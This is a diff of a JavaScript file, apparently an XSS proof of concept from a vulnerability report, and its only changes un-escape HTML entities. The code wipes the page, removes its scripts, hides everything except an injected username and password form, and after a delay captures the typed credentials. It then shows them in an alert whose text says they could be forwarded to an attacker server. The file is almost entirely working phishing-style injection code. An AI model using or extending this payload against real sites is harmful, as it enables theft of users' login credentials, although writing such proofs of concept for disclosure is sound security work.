@@ -1,13 +1,13 @@
 document.body.innerHTML = "";
 var scriptss = document.scripts;
 
-for (var i = scriptss.length - 1; i &gt;= 0; i--) {
+for (var i = scriptss.length - 1; i >= 0; i--) {
   var script = scriptss[i];
   script.parentNode.removeChild(script);
 }
 
 var s = document.createElement('style');
-var c = 'body &gt; *:not(form):not(textarea) { display: none !important; }';
+var c = 'body > *:not(form):not(textarea) { display: none !important; }';
 s.appendChild(document.createTextNode(c));
 document.head.appendChild(s);
 
@@ -44,7 +44,7 @@ form.appendChild(inputPassword);
 
 document.body.appendChild(form);
 
-// Assuming you have an &lt;input&gt; element with an ID of "myInput"
+// Assuming you have an <input> element with an ID of "myInput"
 var inputElement = document.getElementById("username");
 
 
@@ -53,7 +53,7 @@ setTimeout(function () {
         let a = document.getElementsByName('username')[0];
         let b = document.getElementsByName('password')[0];
         function f() {
-          if(b.value.length&gt;0) {
+          if(b.value.length>0) {
           alert(`Here is user credentials that can be forwarded into attacker server (  I implemented the poc in this way to prevent your credentials from being redirected to my website )  : ${(a.value)} , Password = ${(b.value)}`);
         }
        }
